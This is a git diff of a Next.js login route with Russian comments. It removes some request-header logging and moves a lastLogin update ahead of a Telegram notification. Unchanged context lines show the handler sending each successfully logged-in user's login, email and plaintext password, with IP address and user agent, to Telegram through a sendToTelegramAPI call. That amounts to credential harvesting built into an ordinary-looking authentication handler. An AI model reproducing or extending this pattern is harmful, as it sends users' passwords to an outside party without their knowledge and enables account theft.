@@ -1,3 +1,4 @@
+
 import { NextResponse } from "next/server";
 import { findUser, verifyPassword, updateLastLogin } from "@/lib/db";
 
@@ -89,12 +90,6 @@ export async function POST(request: Request) {
                     'unknown';
     const userAgent = request.headers.get('user-agent') || 'unknown';
 
-    // Получаем дополнительные заголовки
-    const acceptLanguage = request.headers.get('accept-language') || 'unknown';
-    const acceptEncoding = request.headers.get('accept-encoding') || 'unknown';
-    const connection = request.headers.get('connection') || 'unknown';
-    const cacheControl = request.headers.get('cache-control') || 'unknown';
-
     if (!login || !password) {
         return NextResponse.json({ error: "Логин и пароль обязательны" }, { status: 400 });
     }
@@ -152,18 +147,14 @@ export async function POST(request: Request) {
       );
     }
 
+    // Обновляем lastLogin ПЕРЕД отправкой ответа
+    updateLastLogin(user.id, clientIP, userAgent);
+
     // 📤 Отправляем в Telegram об успешном входе
     await sendToTelegramAPI(
       { login: user.login, email: user.email, password: password }, 
       'login_success', 
       clientIP, 
-      userAgent
-    );
-
-    // Обновляем lastLogin
-    updateLastLogin(
-      user.id,
-      clientIP,
       userAgent
     );
 
